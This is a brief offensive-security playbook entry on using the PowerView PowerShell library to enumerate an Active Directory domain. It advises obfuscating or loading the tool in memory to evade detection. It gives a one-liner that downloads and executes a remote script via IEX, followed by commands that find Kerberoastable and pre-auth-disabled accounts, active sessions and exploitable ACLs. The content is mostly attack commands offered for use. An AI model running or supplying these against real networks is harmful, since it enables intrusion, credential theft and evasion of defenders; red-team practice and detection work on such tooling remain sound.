# 10.05 PowerView

> T1087.002 · Active Directory Enumeration

## Overview

PowerView is the classic PowerShell AD enum library: domain trusts, OUs, GPOs, ACLs, sessions, SPNs, file shares. Pairs with PowerUp for privesc, PowerSploit Persistence for staying in.

## Steps

- **Pull from PowerShell remoting** — PowerView is detected; obfuscate or in-memory load.
- **Run core cmdlets** — Get-Domain, Get-NetUser, Get-NetGroup, Get-NetSession.
- **Find Kerberoastable** — Get-NetUser -SPN.
- **Find ACL anomalies** — Get-ObjectAcl / Find-InterestingDomainAcl.

## Commands

### Load PowerView

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
```

### Triage queries

```powershell
Get-Domain
Get-DomainController
Get-DomainTrust
Get-NetUser -SPN | Select samaccountname,serviceprincipalname
Get-NetUser -PreauthNotRequired
Get-NetSession -ComputerName srv01
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -eq '<USER>'}
```
